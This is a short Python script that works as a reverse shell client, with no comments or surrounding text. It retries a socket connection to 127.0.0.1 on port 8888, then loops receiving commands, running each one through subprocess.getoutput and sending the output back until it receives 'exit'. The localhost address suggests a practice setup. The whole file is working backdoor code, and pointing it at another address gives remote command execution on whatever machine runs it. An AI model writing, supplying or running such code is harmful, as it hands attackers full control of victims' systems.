import socket
import subprocess

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

while True:
    try:
        s.connect(("127.0.0.1",8888))
        break
   
    except ConnectionRefusedError:
        pass


print("connected")


while True:
    cmd = (s.recv(1024)).decode()
    if cmd == "exit":
        break
    output = subprocess.getoutput(cmd)
    s.send(output.encode())


s.close()